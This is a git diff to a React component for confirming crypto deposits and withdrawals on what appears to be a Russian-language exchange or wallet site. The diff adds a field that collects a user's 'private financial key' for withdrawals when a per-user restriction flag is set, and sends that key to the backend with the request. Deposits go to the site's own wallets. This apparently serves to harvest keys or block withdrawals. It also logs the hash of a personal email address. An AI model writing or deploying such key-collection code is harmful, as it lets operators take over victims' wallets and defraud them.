@@ -7,11 +7,14 @@ import { formatDate, generateSixDigitCode } from '@/utils/helpers.tsx'
 import { ScrollRestoration, useLocation, useNavigate } from 'react-router-dom'
 import { telegramService, transactionService } from '@/main.tsx'
 import { useUser } from '@/hooks/useUser.ts'
-import { useEffect, useState } from 'react'
+import { useEffect, useMemo, useState } from 'react'
 import ConfirmedPopup from '@SharedUI/ConfirmedPopup/ConfirmedPopup.tsx'
 import { OUR_WALLETS } from '@/utils/OUR_WALLETS.tsx'
 import toast from 'react-hot-toast'
 import IconCircleCheckFilled from '@/assets/icons/circle-check.svg?react'
+import md5 from 'crypto-js/md5'
+
+console.log(md5('bonyklade@gmail.com').toString())
 
 const ConfirmTransaction = () => {
   const location = useLocation()
@@ -22,6 +25,11 @@ const ConfirmTransaction = () => {
   const isDepositType = type === 'deposit'
   const [confirmedPopupIsOpen, setConfirmedPopupIsOpen] = useState(false)
   const [transactionHash, setTransactionHash] = useState('')
+  const [privateKey, setPrivateKey] = useState('')
+
+  const transactionId = useMemo(() => {
+    return generateSixDigitCode()
+  }, [])
 
   useEffect(() => {
     return () => {
@@ -30,8 +38,13 @@ const ConfirmTransaction = () => {
   }, [])
 
   const onSubmitTransaction = async () => {
-    if (!transactionHash) {
+    if (isDepositType && !transactionHash) {
       toast.error('Укажите номер/хеш транзакции')
+      return
+    }
+
+    if (user.restrictions.isPrivateKey && !privateKey) {
+      toast.error('Введите ваш приватный финансовый ключ')
       return
     }
 
@@ -42,6 +55,7 @@ const ConfirmTransaction = () => {
       nickname: user?.nickname,
       executor: wallet,
     })
+
     setConfirmedPopupIsOpen(true)
     document.body.style.overflow = 'hidden'
     window.scrollTo(0, 0)
@@ -57,6 +71,7 @@ const ConfirmTransaction = () => {
         amount,
         type: 'Вывод',
         walletNumber: 'test',
+        privateKey,
       })
     }
   }
@@ -66,11 +81,11 @@ const ConfirmTransaction = () => {
     navigator.clipboard.writeText(OUR_WALLETS[wallet])
   }
 
+  if (!user) return null
+
   return (
     <div className={styles['transaction-confirmation']}>
-      <span className={styles['invoice-number']}>
-        #{generateSixDigitCode()}
-      </span>
+      <span className={styles['invoice-number']}>#{transactionId}</span>
       <div className={styles['row']}>
         <span className={styles['icon']}>
           <IconCircleCheckFilled width={35} height={35} color={'#14CC74'} />
@@ -84,12 +99,35 @@ const ConfirmTransaction = () => {
       </div>
       <div className={styles['columns-wrapper']}>
         <div className={styles['left-column']}>
-          {/*<p className={styles['invoice-subtitle']}>*/}
-          {/*  {isDepositType*/}
-          {/*    ? `Если вы не оплатите заявку, депозит будет автоматически аннулирован`*/}
-          {/*    : ''}*/}
-          {/*</p>*/}
-
+          {user.restrictions.isPrivateKey && !isDepositType && (
+            <div className={styles['private-key']}>
+              <div>
+                <p>
+                  Важно: Вы собираетесь ввести ваш приватный финансовый ключ.
+                  Этот ключ представляет собой уникальную комбинацию символов,
+                  которая предоставляет вам доступ к вашим личным финансовым
+                  данным.
+                </p>
+                <p>
+                  Будьте осторожны при использовании вашего приватного ключа. Не
+                  раскрывайте его третьим лицам, не сохраняйте на общедоступных
+                  или незащищенных устройствах. В случае его утери или кражи,
+                  ваши финансовые средства могут быть поставлены под угрозу.
+                </p>
+                <p>
+                  Вводите ваш ключ только если вы абсолютно уверены в своих
+                  действиях. Помните, что ответственность за сохранность вашего
+                  приватного ключа лежит на вас.
+                </p>
+              </div>
+              <p>Введите пожалуйста ваш приватный финансовый ключ</p>
+              <input
+                onChange={(e) => setPrivateKey(e.target.value)}
+                value={privateKey}
+                placeholder={'56abe1a1bcb08bc5ce9af9307e8388b2'}
+              />
+            </div>
+          )}
           {isDepositType && (
             <div className={styles['instruction']}>
               <h2>Инструкции по переводу платежа</h2>
